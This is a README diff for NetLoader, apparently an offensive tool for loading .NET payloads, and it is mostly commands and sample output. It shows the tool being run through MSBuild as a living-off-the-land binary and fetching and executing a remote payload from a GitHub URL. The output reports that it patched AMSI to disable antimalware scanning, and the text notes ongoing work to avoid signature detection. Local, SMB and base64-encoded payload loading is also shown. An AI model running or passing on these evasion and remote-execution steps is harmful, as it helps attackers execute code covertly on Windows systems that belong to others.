@@ -14,6 +14,7 @@ I am doing 24/7 signature checks and pushing updates when possible so I can keep
 # Deploy via LOLBin (MSBuild)
 
 Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
+NetLoader has to be used in interactive mode when deployed using MSBuild
 
 	For 64 bit:
 	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
@@ -21,9 +22,26 @@ Payload for MSBuild is in the /LOLBins folder, might push this for varius other 
 	For 32 bit:
 	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
 	
+	Example:
+	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
+	Microsoft (R) Build Engine version 4.7.3190.0
+	[Microsoft .NET Framework, version 4.0.30319.42000]
+	Copyright (C) Microsoft Corporation. All rights reserved.
+
+	Build started 6/9/2020 10:54:26 PM.
+	[!] ~Flangvik  #NetLoader
+	[?] Input X in 'path or url' to exit!
+	[?] Input path or url ->
+	https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
+	[?] Input args (optional) ->
+	whoami
+	[+] Successfully patched AMSI!
+	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
+	[+] Arguments : whoami
+	windef\tigerking
 
 # Usage
-Deploy payload from remote URI with args
+Deploy payload from remote URI with args, non-interactive mode
 
 	PS D:\NetLoader> .\NetLoader.exe https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin whoami
 	[!] ~Flangvik  #NetLoader
@@ -33,8 +51,22 @@ Deploy payload from remote URI with args
 	windef\tigerking
 	PS D:\NetLoader>
 
+Deploy payload from remote URI with args, interactive mode
 
-Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote)
+	PS D:\NetLoader> .\NetLoader.exe
+	[!] ~Flangvik  #NetLoader
+	[?] Input X in 'path or url' to exit!
+	[?] Input path or url ->
+	https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
+	[?] Input args (optional) ->
+	whoami
+	[+] Successfully patched AMSI!
+	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
+	[+] Arguments : whoami
+	windef\tigerking
+	PS D:\NetLoader>
+
+Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote), non-interactive
 
 	.\NetLoader.exe D:\Tools\Stracciatella.bin whoami
 	[!] ~Flangvik  #NetLoader
@@ -45,7 +77,7 @@ Deploy payload from local path or SMB share (note that NetLoader automatically d
 	PS D:\NetLoader>
 
 
-Supports base64 inputs for those long strings that would usually break stuff!
+Supports base64 inputs for those long strings that would usually break stuff! (non-interactive)
 
 	PS D:\NetLoader> .\NetLoader.exe --b64 aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu d2hvYW1p
 	[!] ~Flangvik  #NetLoader
